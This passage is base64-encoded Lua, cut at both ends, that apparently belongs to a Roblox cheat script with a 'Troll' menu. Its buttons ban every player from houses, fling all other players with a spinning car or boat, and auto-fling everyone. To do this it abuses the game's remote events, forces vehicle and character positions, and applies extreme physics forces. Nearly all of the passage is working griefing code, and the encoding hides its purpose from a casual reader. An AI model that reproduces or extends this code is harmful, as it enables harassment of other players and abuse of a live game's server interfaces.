iAgICAgICAgICAgICAgICBsb2NhbCBDbGlja0RldGVjdG9yID0gQnV5RGV0ZWN0b3I6RmluZEZpcnN0Q2hpbGQoIkNsaWNrRGV0ZWN0b3IiKQogICAgICAgICAgICAgICAgaWYgQ2xpY2tEZXRlY3RvciB0aGVuCiAgICAgICAgICAgICAgICAgICAgZmlyZWNsaWNrZGV0ZWN0b3IoQ2xpY2tEZXRlY3RvcikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCgogICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgbG9jYWwgUHJlSG91c2UgPSBIb3VzZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUgLi4gIkhvdXNlIikKICAgICAgICBpZiBQcmVIb3VzZSB0aGVuCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIGxvY2FsIE51bWJlcgogICAgICAgICAgICBmb3IgaSwgeCBpbiBwYWlycyhQcmVIb3VzZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgeC5OYW1lID09ICJOdW1iZXIiIGFuZCB4OklzQSgiTnVtYmVyVmFsdWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgTnVtYmVyID0geAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFHZXR0aW4xZ0hvdXMxZSIpOkZpcmVTZXJ2ZXIoIlBpY2tpbmdDdXN0b21Ib3VzZSIsICIwNDlfSG91c2UiLCBOdW1iZXIuVmFsdWUpCiAgICAgICAgZW5kCgoKICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgIGxvY2FsIFBDYXIgPSBWZWhpY2xlczpGaW5kRmlyc3RDaGlsZChQbGF5ZXIuTmFtZS4uIkNhciIpCiAgICAgICAgaWYgbm90IFBDYXIgdGhlbgogICAgICAgICAgICBpZiBDaGVjaygpIHRoZW4KICAgICAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMTExOC44MSwgNzUuOTk4LCAtMTEzOC42MSkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFDYTFyIik6RmlyZVNlcnZlcigiUGlja2luZ0NhciIsICJTY2hvb2xCdXMiKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgIGxvY2FsIFBDYXIgPSBWZWhpY2xlczpGaW5kRmlyc3RDaGlsZChQbGF5ZXIuTmFtZS4uIkNhciIpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgbG9jYWwgU2VhdCA9IFBDYXI6RmluZEZpcnN0Q2hpbGQoIkJvZHkiKSBhbmQgUENhci5Cb2R5OkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlU2VhdCIpCiAgICAgICAgICAgICAgICBpZiBTZWF0IHRoZW4KICAgICAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gU2VhdC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIG1hdGgucmFuZG9tKC0xLCAxKSwgMCkKICAgICAgICAgICAgICAgICAgICB1bnRpbCBIdW1hbm9pZC5TaXQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCgogICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgbG9jYWwgUENhciA9IFZlaGljbGVzOkZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi4iQ2FyIikKICAgICAgICBpZiBQQ2FyIHRoZW4KICAgICAgICAgICAgaWYgbm90IEh1bWFub2lkLlNpdCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBTZWF0ID0gUENhcjpGaW5kRmlyc3RDaGlsZCgiQm9keSIpIGFuZCBQQ2FyLkJvZHk6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVTZWF0IikKICAgICAgICAgICAgICAgIGlmIFNlYXQgdGhlbgogICAgICAgICAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBTZWF0LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgbWF0aC5yYW5kb20oLTEsIDEpLCAwKQogICAgICAgICAgICAgICAgICAgIHVudGlsIEh1bWFub2lkLlNpdAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKCiAgICAgICAgICAgIGxvY2FsIFRhcmdldCA9IHRhcmdldFBsYXllcgogICAgICAgICAgICBsb2NhbCBUYXJnZXRDID0gVGFyZ2V0LkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCBUYXJnZXRIID0gVGFyZ2V0QzpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgbG9jYWwgVGFyZ2V0UlAgPSBUYXJnZXRDOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgaWYgVGFyZ2V0QyBhbmQgVGFyZ2V0SCBhbmQgVGFyZ2V0UlAgdGhlbgogICAgICAgICAgICAgICAgaWYgbm90IFRhcmdldEguU2l0IHRoZW4KICAgICAgICAgICAgICAgICAgICB3aGlsZSBub3QgVGFyZ2V0SC5TaXQgZG8KICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRmxpbmcgPSBmdW5jdGlvbih0YXJnZXQsIHBvcywgYW5nbGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ2FyOlNldFByaW1hcnlQYXJ0Q0ZyYW1lKENGcmFtZS5uZXcodGFyZ2V0LlBvc2l0aW9uKSAqIHBvcyAqIGFuZ2xlKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgQW5nbGVzID0gQW5nbGVzICsgMTAwCiAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KDAsIDEuNSwgMCkgKyBUYXJnZXRILk1vdmVEaXJlY3Rpb24gKiBUYXJnZXRSUC5WZWxvY2l0eS5NYWduaXR1ZGUgLyAxLjEwLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlcyksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICBGbGluZyhUYXJnZXRSUCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAwKSArIFRhcmdldEguTW92ZURpcmVjdGlvbiAqIFRhcmdldFJQLlZlbG9jaXR5Lk1hZ25pdHVkZSAvIDEuMTAsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KDIuMjUsIDEuNSwgLTIuMjUpICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICogVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4xMCwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgRmxpbmcoVGFyZ2V0UlAsIENGcmFtZS5uZXcoLTIuMjUsIC0xLjUsIDIuMjUpICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICogVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4xMCwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgRmxpbmcoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMCwgMS41LCAwKSArIFRhcmdldEguTW92ZURpcmVjdGlvbiAqIFRhcmdldFJQLlZlbG9jaXR5Lk1hZ25pdHVkZSAvIDEuMTAsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KDAsIC0xLjUsIDApICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICogVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4xMCwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIEhvdXNlID0gSG91c2VzOkZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi4iSG91c2UiKQogICAgICAgICAgICAgICAgICAgIFBDYXI6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyhIb3VzZS5Ib3VzZVNwYXduUG9zaXRpb24uUG9zaXRpb24pKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcmVnaW9uID0gUmVnaW9uMy5uZXcoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uIC0gVmVjdG9yMy5uZXcoMzAsMzAsMzApLCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24gKyBWZWN0b3IzLm5ldygzMCwzMCwzMCkpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGFydHNJblJlZ2lvbiA9IHdvcmtzcGFjZTpGaW5kUGFydHNJblJlZ2lvbjMocmVnaW9uLCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQsIG1hdGguaHVnZSkKICAgICAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhwYXJ0c0luUmVnaW9uKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIkh1bWFub2lkUm9vdFBhcnQiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKTpGaW5kRmlyc3RDaGlsZCh2LlBhcmVudC5OYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSAiQmFuUGxheWVyRnJvbUhvdXNlIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSBiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFszXSA9IHYuUGFyZW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFQbGF5ZTFyVHJpZ2dlMXJFdmVuMXQiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCgogICAgLS0gRGVsZXRlIHZlaGljbGUKICAgIGxvY2FsIGRlbGV0ZUFyZ3MgPSB7CiAgICAgICAgWzFdID0gIkRlbGV0ZUFsbFZlaGljbGVzIgogICAgfQogICAgUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJSRSIpOldhaXRGb3JDaGlsZCgiMUNhMXIiKTpGaXJlU2VydmVyKHVucGFjayhkZWxldGVBcmdzKSkKZW5kCgoKLS0gSXRlcmF0ZSBvdmVyIGFsbCBwbGF5ZXJzIG9uIHRoZSBtYXAKZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgIGlmIHBsYXllciB+PSBQbGF5ZXJzLkxvY2FsUGxheWVyIHRoZW4KICAgICAgICBleGVjdXRlU2NyaXB0Rm9yUGxheWVyKHBsYXllcikKICAgICAgIHRhc2sud2FpdCgyKQogICAgZW5kCmVuZAogICAgZW5kCn0pCnByaW50KCJIb3VzZSBCYW4ga2lsbCBBbGwgYnV0dG9uIGNyZWF0ZWQiKQoKVHJvbGw6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiRmxpbmcgZXZlcnlvbmUgdXNpbmcgYm9hdCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBQbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIENoYXJhY3RlciA9IFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIEh1bWFub2lkID0gQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgbG9jYWwgUm9vdFBhcnQgPSBDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgbG9jYWwgVmVoaWNsZXMgPSBnYW1lLldvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiVmVoaWNsZXMiKQogICAgbG9jYWwgT2xkUG9zID0gUm9vdFBhcnQuQ0ZyYW1lCiAgICBsb2NhbCBBbmdsZXMgPSAwCiAgICBsb2NhbCBQQ2FyID0gVmVoaWNsZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUuLiJDYXIiKQogICAgCiAgICAtLSBJZiBubyBjYXIsIGNyZWF0ZSBvbmUKICAgICAgICAgICAgaWYgbm90IFBDYXIgdGhlbiAgCiAgICAgICAgICAgICAgICBpZiBSb290UGFydCB0aGVuICAKICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDE3NTQsIC0yLCA1OCkgIAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpICAKICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFDYTFyIik6RmlyZVNlcnZlcigiUGlja2luZ0JvYXQiLCAiTWlsaXRhcnlCb2F0RnJlZSIpICAKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KSAgCiAgICAgICAgICAgICAgICAgICAgUENhciA9IFZlaGljbGVzOkZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lLi4iQ2FyIikgIAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBTZWF0ID0gUENhcjpGaW5kRmlyc3RDaGlsZCgiQm9keSIpIGFuZCBQQ2FyLkJvZHk6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVTZWF0IikgIAogICAgICAgICAgICAgICAgICAgIGlmIFNlYXQgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKSAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBTZWF0LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgbWF0aC5yYW5kb20oLTEsIDEpLCAwKSAgCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIEh1bWFub2lkLlNpdCAgCiAgICAgICAgICAgICAgICAgICAgZW5kICAKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICB0YXNrLndhaXQoMC41KSAgCiAgICAgICAgICAgIFBDYXIgPSBWZWhpY2xlczpGaW5kRmlyc3RDaGlsZChQbGF5ZXIuTmFtZS4uIkNhciIpICAKICAgICAgCiAgICAgICAgICAgIC0tIElmIHRoZSBjYXIgZXhpc3RzLCB0ZWxlcG9ydCB0byB0aGUgc2VhdCBpZiBuZWNlc3NhcnkKICAgICAgICAgICAgaWYgUENhciB0aGVuICAKICAgICAgICAgICAgICAgIGlmIG5vdCBIdW1hbm9pZC5TaXQgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgU2VhdCA9IFBDYXI6RmluZEZpcnN0Q2hpbGQoIkJvZHkiKSBhbmQgUENhci5Cb2R5OkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlU2VhdCIpICAKICAgICAgICAgICAgICAgICAgICBpZiBTZWF0IHRoZW4gIAogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gU2VhdC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIG1hdGgucmFuZG9tKC0xLCAxKSwgMCkgIAogICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCBIdW1hbm9pZC5TaXQgIAogICAgICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgICAgICBlbmQgIAogICAgICAgICAgICBlbmQgIAogICAgICAKICAgICAgICAgICAgLS0gQWRkIEJvZHlHeXJvIHRvIHRoZSBjYXIgZm9yIG1vdmVtZW50IGNvbnRyb2wKICAgICAgICAgICAgbG9jYWwgU3Bpbkd5cm8gPSBJbnN0YW5jZS5uZXcoIkJvZHlHeXJvIikgIAogICAgICAgICAgICBTcGluR3lyby5QYXJlbnQgPSBQQ2FyLlByaW1hcnlQYXJ0ICAKICAgICAgICAgICAgU3Bpbkd5cm8uTWF4VG9ycXVlID0gVmVjdG9yMy5uZXcoMWU3LCAxZTcsIDFlNykgIAogICAgICAgICAgICBTcGluR3lyby5QID0gMWU3ICAKICAgICAgICAgICAgU3Bpbkd5cm8uQ0ZyYW1lID0gUENhci5QcmltYXJ5UGFydC5DRnJhbWUgKiBDRnJhbWUuQW5nbGVzKDAsIG1hdGgucmFkKDkwKSwgMCkgIAogICAgICAKICAgICAgICAgICAgLS0gRmxpbmcgZnVuY3Rpb24gZm9yIGVhY2ggcGxheWVyIGZvciAzIHNlY29uZHMKICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gZmxpbmdQbGF5ZXIoVGFyZ2V0QywgVGFyZ2V0UlAsIFRhcmdldEgpCiAgICBBbmdsZXMgPSAwICAKICAgICAgICAgICAgICAgIGxvY2FsIGVuZFRpbWUgPSB0aWNrKCkgKyAxICAtLSBTZXQgZW5kIHRpbWUgdG8gMiBzZWNvbmRzIGZyb20gbm93CiAgICAgICAgICAgICAgICB3aGlsZSB0aWNrKCkgPCBlbmRUaW1lIGRvICAKICAgICAgICAgICAgICAgICAgICBBbmdsZXMgPSBBbmdsZXMgKyAxMDAgIAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpICAKICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gTW92ZW1lbnRzIGFuZCBhbmdsZXMgZm9yIHRoZSBGbGluZwogICAgICAgICAgICAgICAgICAgIGxvY2FsIGtpbGwgPSBmdW5jdGlvbih0YXJnZXQsIHBvcywgYW5nbGUpICAKICAgICAgICAgICAgICAgICAgICAgICAgUENhcjpTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KHRhcmdldC5Qb3NpdGlvbikgKiBwb3MgKiBhbmdsZSkgIAogICAgICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIEZsaW5nIHRvIHZhcmlvdXMgcG9zaXRpb25zIGFyb3VuZCB0aGUgVGFyZ2V0UlAKICAgICAgICAgICAgICAgICAgICBraWxsKFRhcmdldFJQLCBDRnJhbWUubmV3KDAsIDMsIDApLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlcyksIDAsIDApKSAgCiAgICAgICAgICAgICAgICAgICAga2lsbChUYXJnZXRSUCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAyKSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkgIAogICAgICAgICAgICAgICAgICAgIGtpbGwoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMiwgMS41LCAyLjI1KSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCg1MCksIDAsIDApKSAgCiAgICAgICAgICAgICAgICAgICAga2lsbChUYXJnZXRSUCwgQ0ZyYW1lLm5ldygtMi4yNSwgLTEuNSwgMi4yNSksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoMzApLCAwLCAwKSkgIAogICAgICAgICAgICAgICAgICAgIGtpbGwoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMCwgMS41LCAwKSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkgIAogICAgICAgICAgICAgICAgICAgIGtpbGwoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMCwgLTEuNSwgMCksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpICAKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICAtLSBJdGVyYXRlIG92ZXIgYWxsIHBsYXllcnMKICAgICAgICAgICAgZm9yIF8sIFRhcmdldCBpbiBwYWlycyhnYW1lLlBsYXllcnM6R2V0UGxheWVycygpKSBkbyAgCiAgICAgICAgICAgICAgICAtLSBTa2lwIHRoZSBsb2NhbCBwbGF5ZXIKICAgICAgICAgICAgICAgIGlmIFRhcmdldCB+PSBQbGF5ZXIgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgVGFyZ2V0QyA9IFRhcmdldC5DaGFyYWN0ZXIgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldEggPSBUYXJnZXRDIGFuZCBUYXJnZXRDOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKSAgCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgVGFyZ2V0UlAgPSBUYXJnZXRDIGFuZCBUYXJnZXRDOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgIAogICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBJZiB0aGUgdGFyZ2V0IGFuZCBpdHMgY29tcG9uZW50cyBhcmUgZm91bmQsIGV4ZWN1dGUgdGhlIGZsaW5nCiAgICAgICAgICAgICAgICAgICAgaWYgVGFyZ2V0QyBhbmQgVGFyZ2V0SCBhbmQgVGFyZ2V0UlAgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgICAgIGZsaW5nUGxheWVyKFRhcmdldEMsIFRhcmdldFJQLCBUYXJnZXRIKSAgLS0gRmxpbmcgdGhlIGN1cnJlbnQgcGxheWVyCiAgICAgICAgICAgICAgICAgICAgZW5kICAKICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgIAogICAgICAgICAgICAtLSBSZXR1cm4gdGhlIHBsYXllciB0byB0aGVpciBvcmlnaW5hbCBwb3NpdGlvbgogICAgICAgICAgICB0YXNrLndhaXQoMC41KSAgCiAgICAgICAgICAgIFBDYXI6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldygwLCAwLCAwKSkgIAogICAgICAgICAgICB0YXNrLndhaXQoMC41KSAgCiAgICAgICAgICAgIEh1bWFub2lkLlNpdCA9IGZhbHNlICAKICAgICAgICAgICAgdGFzay53YWl0KDAuNSkgIAogICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBPbGRQb3MgIAogICAgICAKICAgICAgICAgICAgLS0gUmVtb3ZlIHRoZSBCb2R5R3lybyBhZnRlciB0aGUgZWZmZWN0CiAgICAgICAgICAgIFNwaW5HeXJvOkRlc3Ryb3koKSAgCiAgICBlbmQKfSkKcHJpbnQoIkZsaW5nIEJvYXQgQWxsIGJ1dHRvbiBjcmVhdGVkIikKClRyb2xsOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkF1dG8gRmxpbmcgZXZlcnlvbmUiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICBsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKICAgIGxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCiAgICBsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNhbSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCgoKICAgIGxvY2FsIGZ1bmN0aW9uIFByb2Nlc3NQbGF5ZXIodGFyZ2V0KQogICAgICAgIGlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXIgb3IgdGFyZ2V0ID09IExvY2FsUGxheWVyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIGZsaW5nQWN0aXZlID0gdHJ1ZQogICAgICAgIGxvY2FsIHJvb3QgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgdFJvb3QgPSB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBpZiBub3Qgcm9vdCBvciBub3QgdFJvb3QgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIGh1bSA9IGNoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgbG9jYWwgb3JpZ2luYWwgPSByb290LkNGcmFtZQoKICAgIAogICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDbGVhMXJUb29sMXMiKTpGaXJlU2VydmVyKCJDbGVhckFsbFRvb2xzIikKICAgICAgICB0YXNrLndhaXQoMC4yKQoKICAKICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKCJQaWNraW5nVG9vbHMiLCAiQ291Y2giKQogICAgICAgIHRhc2sud2FpdCgwLjMpCgogICAgICAgIGxvY2FsIHRvb2wgPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKQogICAgICAgIGlmIHRvb2wgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IGNoYXIKICAgICAgICBlbmQKdGFzay53YWl0KDAuMSkKCmdhbWU6R2V0U2VydmljZSgiVmlydHVhbElucHV0TWFuYWdlciIpOlNlbmRLZXlFdmVudCh0cnVlLCBFbnVtLktleUNvZGUuRiwgZmFsc2UsIGdhbWUpCnRhc2sud2FpdCgwLjI1KQoKICAgICAgICB3b3Jrc3BhY2UuRmFsbGVuUGFydHNEZXN0cm95SGVpZ2h0ID0gMC8wCgogICAgICAgIGxvY2FsIGJ2ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQogICAgICAgIGJ2Lk5hbWUgPSAiRmxpbmdGb3JjZSIKICAgICAgICBidi5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICAgICAgYnYuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQogICAgICAgIGJ2LlBhcmVudCA9IHJvb3QKCiAgICAgICAgaHVtOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgZmFsc2UpCiAgICAgICAgaHVtLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpIG9yIHRSb290IG9yIGh1bQoKIAogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBhbmdsZSA